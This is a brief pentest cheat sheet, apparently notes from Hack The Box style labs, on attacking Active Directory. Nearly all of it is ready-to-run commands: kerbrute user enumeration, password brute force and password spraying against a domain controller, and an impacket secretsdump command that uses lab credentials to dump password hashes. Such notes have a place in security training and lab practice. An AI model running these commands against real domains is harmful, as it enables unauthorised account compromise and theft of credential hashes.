instal binary from https://github.com/ropnop/kerbrute/releases/tag/v1.0.3

## EnumUser

```
./kerbrute userenum -v --dc <IP address> -d <Domain> <User list>
```

## BruteUser

```
./kerbrute bruteuser -v --dc <IP address> -d <Domain> <Passoword list> <Username>
```

## Userlist & one password

```
./kerbrute passwordspray -v --dc 10.10.10.169 -d megabank.local users.txt 'Welcome123!
```

## seretsdump.py (impacket)

```
secretsdump.py 'htb.local/james:J@m3s_P@ssW0rd!@10.10.10.52'
```
